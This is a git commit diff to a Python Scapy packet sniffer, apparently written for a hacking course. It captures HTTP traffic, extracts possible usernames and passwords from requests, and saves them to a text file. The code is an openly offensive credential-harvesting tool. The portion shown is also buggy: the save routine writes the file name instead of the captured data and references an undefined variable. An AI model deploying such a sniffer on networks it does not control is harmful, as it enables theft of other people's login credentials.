d0d7cf74f2d6fb08e73a3c8aebf0c0151603099d
Mohamed Dief <54229853+DEMON1A@users.noreply.github.com>
2020-04-04 02:23:02 +0200

    Update Packet_sniffer.py

--- Packet_sniffer.py
+++ Packet_sniffer.py
@@ -1,13 +1,20 @@
+#/usr/bin/env python3
 '''
-This Tool Use Scapy Package!
+This Tool Realeted To Zaid Sabih Python Course But In Python3
+This Tool Use Scapy Package To Sniff And Get Data!
+It Will Sniff Any Data Not Just Web Data On HTTP Protocol You Can Add A Filter
 Feel Free TO Edit It Is Yours!
 I Will Clean The Code On That Update And Add Some Things!
+I Have Explain The Code On Some Comments
+Maybe There Is Some Problems I Wil Try To Solvw It LOL!
+Have Fun!
 '''
 import scapy.all as scapy 
 from scapy.layers import http
 
 def SmallBanner():
-	Banner = "\t\t\t\t[+] << PACKET-SNIFFER >> [+]"
+	Some = "\t\t\t\t\t\t\t"
+	Banner = Some + "[+] << PACKET-SNIFFER >> [+]"
 	print(Banner)
 
 # Get Inputs First!
@@ -29,23 +36,23 @@ def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You 
 					break # LOL IDK Why I But Break If There is An Return Function But I Will Leave That Here LOL
 
 def SniffNetworkTrafic(packet):
-	if packet.haslayer(http.HTTPRequest):
-		url = get_url(packet)
-		print("[+] HTTP REQUEST >>" + url)
+	if packet.haslayer(http.HTTPRequest):# Check IF This Request Is HTTP Request IF true Complete This Statment!
+		HTTPData = GetDataFromHTTP(packet) 
+		print("[+] HTTP REQUEST >>" + HTTPData) # Tell You That There Is A Traffic On Port 80 (HTTP Port)
 
 		LoginData = GetLoginDataFromSites(packet)
 		if LoginData: # If Login Data Returns 'True' Then Do That Print Function
-			PossibleLoginList.append(LoginData)
-			print("\n[+] Possible User/Password >> {0} \n".format(LoginData))
+			PossibleLoginList.append(LoginData) # Add Data To Logins List To Save It
+			print("\n[+] Possible User/Password >> {0} \n".format(LoginData)) # aTell You That There Is A Possible Login Data
 
 def ExtractAllPossibleLoginsOnTXT():
 	FileName = input("Give Me A Name For Logins File: ") # EX : Login
-	for Data in PossibleLoginList:
+	for Data in PossibleLoginList: # For Each Item iN This List Take Every Item And Put It In that File With New Line!
 		with open('{0}.txt'.format(FileName),'w') as LoginsFile:
-			LoginFile.write("{0}\n".format(FileName))
+			LoginFile.write("{0}\n".format(FileName)) # Write Data To login File
 		print("[+] Data Saved!")
 
 # Start Functions After Get Inputs!
-SmallBanner()
-StartSniffData(InterFace)
-ExtractAllPossibleLoginsOnTXT()
+SmallBanner() # Print The Banner
+StartSniffData(InterFace) # Start Sniff Data From Selected InterFACE 
+ExtractAllPossibleLoginsOnTXT() # Save Login Information On A Text File
